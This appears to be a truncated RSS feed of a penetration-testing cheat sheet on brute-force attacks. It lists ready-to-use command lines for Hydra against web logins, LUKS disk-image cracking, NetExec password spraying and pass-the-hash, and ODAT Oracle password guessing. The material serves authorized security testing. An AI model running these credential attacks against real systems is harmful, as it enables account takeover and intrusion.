channel.title: Brute Force on TLDRBins
channel.description: Recent content in Brute Force on TLDRBins

item.title: Hydra
item.description: HTTP basic auth hydra -L <USERS_FILE> -P <PASSWORD_FILE> -s <TARGET_PORT> -f <TARGET> http-get / +-------------------------------------------+ | -s : port | | -L : usernames file | | -P : passwords file | | -f : exit when a login/pass pair is found | +-------------------------------------------+ Web Page Login Form hydra <TARGET> -l <USER> -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form '/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password' +-------------------------------------------+ | -l : username | | -P : wordlist | | http-post-form : service | | /login.

item.title: Linux hard disk encryption
item.description: Brute force LUKS password bruteforce-luks -t 10 -f <WORDLIST> -w state.txt -v 30 <BACKUP_IMG> Note: This is slow, create a small wordlist Basic # Open cryptsetup open --type luks <BACKUP_IMG> backup # Check ls -l /dev/mapper/ # Create mount folder sudo mkdir /mnt/backup # Mount sudo mount /dev/mapper/backup /mnt/backup/

item.title: NetExec (nxc)
item.description: Basic Commands Password NTLM Kerberos # Single User, Single Password nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' # Single User, Single Password, Local Auth nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth # Single User, Single Password (Active Directory) nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> # Single User, Multiple Passwords nxc <PROTOCOL> <TARGET> -u '<USER>' -p <PASSWORDS> -d <DOMAIN> # Multiple Users, Single Password nxc <PROTOCOL> <TARGET> -u <USERS> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success # Multiple Users, Multiple Passwords nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> -d <DOMAIN> --continue-on-success # Match Username to Corresponding Password nxc <PROTOCOL> <TARGET> -u <USERS> -p <PASSWORDS> --no-bruteforce --continue-on-success nxc <PROTOCOL> <TARGET> -u '<USER>' -H <HASH> # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) nxc <PROTOCOL> <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k # With Kerberos ccache, or STATUS_NOT_SUPPORTED (NTLM disabled) nxc <PROTOCOL> <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache Hint: We can also run on multiple targets

item.title: Oracle Database
item.description: Tools sqlplus ODAT # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Install sudo apt install odat # Check odat --version Ref: Download ODAT Enum # SID enum (You only need one) odat sidguesser -s <TARGET> # User/Password brute force odat passwordguesser -s <TARGET> -d <SID> --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s <TARGET> -U '<USER>' -P '<PASSWORD>' -d <SID> --sysdba General # Export everytime or add to ~/.
